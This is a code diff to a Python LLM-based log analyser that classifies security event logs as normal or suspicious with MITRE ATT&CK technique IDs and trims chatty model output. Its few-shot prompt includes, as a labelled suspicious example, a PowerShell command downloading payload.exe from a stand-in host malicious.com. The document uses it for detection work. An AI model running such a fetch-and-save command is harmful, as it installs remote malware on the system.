@@ -104,23 +104,33 @@ class MLService:
             log_input = log_input[:settings.MAX_INPUT_CHARS] + "... [truncated]"
         
         # FEW-SHOT PROMPT from metrics.ipynb (Cell 8) - THIS IS WHAT WORKED
+        # UPDATED: Show explicit MITRE Techniques line in examples
         prompt = f"""You are a cybersecurity analyst. Analyze system logs and determine if they show normal or suspicious activity.
 
 Output format:
 Status: Normal OR Status: Suspicious
+MITRE Techniques: T#### (Name), T#### (Name)  <- ONLY if Status is Suspicious
 Reason: Brief explanation
 
-### Example 1:
+### Example 1 (Normal):
 Input: {{"EventID": 4624, "LogonType": 2, "Account": "user@domain.com", "Workstation": "DESKTOP-123"}}
 Response:
 Status: Normal
 Reason: Standard interactive logon (LogonType 2) from a legitimate user account on a known workstation. No indicators of compromise.
 
-### Example 2:
+### Example 2 (Suspicious):
 Input: {{"EventID": 4688, "Process": "powershell.exe", "CommandLine": "Invoke-WebRequest http://malicious.com/payload.exe -OutFile C:\\\\temp\\\\mal.exe", "User": "SYSTEM"}}
 Response:
 Status: Suspicious
-Reason: PowerShell executing under SYSTEM context downloading executable from external site - indicates potential malware download (T1105 - Ingress Tool Transfer).
+MITRE Techniques: T1105 (Ingress Tool Transfer), T1059.001 (PowerShell)
+Reason: PowerShell executing under SYSTEM context downloading executable from external site - indicates potential malware download.
+
+### Example 3 (Suspicious):
+Input: {{"EventID": 3, "Protocol": "TCP", "SourceIP": "10.0.0.5", "DestIP": "185.220.101.50", "DestPort": "443"}}
+Response:
+Status: Suspicious
+MITRE Techniques: T1071.001 (Application Layer Protocol), T1090 (Proxy)
+Reason: Outbound HTTPS connection to suspicious IP address associated with known command and control infrastructure.
 
 ### Now analyze this log:
 Input: {log_input}
@@ -176,16 +186,23 @@ Response:
             mitre_line = mitre_line_match.group(1)
             # Extract all T#### patterns from the line
             result["mitre_techniques"] = list(set(re.findall(r'T\d{4}(?:\.\d{3})?', mitre_line)))
+            logger.info(f"Found MITRE Techniques line: {result['mitre_techniques']}")
         else:
             # FALLBACK: Extract T#### patterns from anywhere in the output
             # This handles cases where model mentions techniques in reason but not in separate line
             all_techniques = list(set(re.findall(r'T\d{4}(?:\.\d{3})?', output_clean)))
             if all_techniques:
                 result["mitre_techniques"] = all_techniques
+                logger.warning(f"No explicit MITRE Techniques line, extracted from text: {all_techniques}")
         
         # If we found MITRE techniques but status wasn't set, it must be suspicious
         if result["mitre_techniques"] and result["status"] == "Normal":
             result["status"] = "Suspicious"
+            logger.warning("Found techniques but status was Normal - overriding to Suspicious")
+        
+        # Warn if suspicious but no techniques found
+        if result["status"] == "Suspicious" and not result["mitre_techniques"]:
+            logger.warning("⚠️ Status is Suspicious but NO MITRE techniques found!")
         
         # Extract reason - comes after "Reason:" 
         reason_match = re.search(r'Reason:\s*(.+)', output_clean, re.DOTALL | re.IGNORECASE)
@@ -287,10 +304,11 @@ Response:
             
             # Post-process: Remove conversational follow-ups and unwanted continuations
             # The model sometimes continues generating after the Reason, adding conversational text
+            # Be VERY aggressive with stopping patterns
             stopping_patterns = [
-                "\n\nPlease note",      # Common continuation pattern
+                "\n\nPlease",           # Any "Please" continuation
                 "\n\nHuman:",           # Chat-style continuation
-                "\n\nAssistant:",       # Chat-style continuation
+                "\n\nAssistant:",       # Chat-style continuation  
                 "\n\nInput:",           # Trying to analyze another log
                 "\n\n### Example",      # Trying to give more examples
                 "\n\nCan you",          # Asking follow-up questions
@@ -299,19 +317,48 @@ Response:
                 "\n\n---",              # Separator lines
                 "\n\nI ",               # First-person continuation
                 "\n\nThe analysis",     # Meta-commentary
-                "Human:",               # Without double newline
-                "Assistant:",           # Without double newline
+                "\nHuman:",             # Single newline variant
+                "\nAssistant:",         # Single newline variant
+                "Human:",               # No newline at all
+                "Assistant:",           # No newline at all
+                "\nPlease provide",     # Asking for more details
+                "\nI want to",          # Conversational continuation
+                "\nFor example,",       # Providing examples
+                "\nThank you",          # Polite endings
+                "\nCould you",          # Questions
+                "\nWould you",          # Questions
             ]
             
             original_length = len(generated_text)
             for pattern in stopping_patterns:
                 if pattern in generated_text:
                     generated_text = generated_text.split(pattern)[0]
-                    logger.info(f"Trimmed at '{pattern}': {original_length} -> {len(generated_text)} chars")
+                    logger.info(f"✂️ Trimmed at '{pattern}': {original_length} -> {len(generated_text)} chars")
                     break
             
-            # Also trim if response ends with incomplete sentence after trimming
-            generated_text = generated_text.rstrip()
+            # Additional aggressive trimming: if we see anything that looks like a question or continuation
+            # after "Reason:", cut it off
+            lines = generated_text.split('\n')
+            clean_lines = []
+            found_reason = False
+            
+            for line in lines:
+                clean_lines.append(line)
+                if line.strip().startswith('Reason:'):
+                    found_reason = True
+                # After finding Reason, stop at any line that looks conversational
+                elif found_reason and line.strip():
+                    # Check if this line looks like conversational continuation
+                    lower_line = line.lower().strip()
+                    if any(lower_line.startswith(phrase) for phrase in [
+                        'please', 'human:', 'assistant:', 'i want', 'could you', 
+                        'would you', 'for example', 'thank you', 'can you'
+                    ]):
+                        clean_lines.pop()  # Remove this line
+                        logger.info(f"✂️ Removed conversational line after Reason: '{line[:50]}...'")
+                        break
+            
+            generated_text = '\n'.join(clean_lines).rstrip()
             
             logger.info(f"Final output: {len(generated_text)} characters")
             
